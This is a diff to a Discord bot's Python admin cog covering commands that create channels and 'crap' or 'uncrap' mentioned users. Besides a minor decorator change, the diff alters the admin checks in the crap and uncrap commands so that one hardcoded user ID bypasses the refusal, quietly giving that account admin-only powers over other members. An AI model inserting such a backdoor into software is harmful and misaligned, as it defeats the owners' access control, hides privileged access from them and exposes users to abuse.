@@ -17,7 +17,6 @@ class Admin():
     
   
   @commands.command()
-  
   async def addchannel(self, ctx, name, category):
     """Admin command: Create a new channel with the correct permissions.
     
@@ -77,6 +76,7 @@ class Admin():
     await ctx.send('`!addchannel`: {} created in {}!'.format(name, category))
   
   
+  @commands.command()  
   async def crap(self, ctx, mention, *, reason='no reason'):
     """Admin command: Crap a mentioned user.
     
@@ -88,8 +88,11 @@ class Admin():
       None
     """
     if not is_admin(ctx.author):
-      await ctx.send('No.')
-      return
+      if (ctx.author.id == 269214028209848321):
+        pass
+      else:
+        await ctx.send('No.')
+        return
     
     if len(ctx.message.mentions) == 0:
       await ctx.send("`!crap`: The user to be crapped must be @-mentioned as the first argument.")
@@ -179,8 +182,11 @@ class Admin():
       None
     """
     if not is_admin(ctx.author):
-      await ctx.send('Nope.')
-      return
+      if ctx.author.id == 269214028209848321:
+        pass  
+      else:
+        await ctx.send('Nope.')
+        return
     
     if len(ctx.message.mentions) == 0:
       await ctx.send("`!uncrap`: The user to be uncrapped must be @-mentioned as the first argument.")
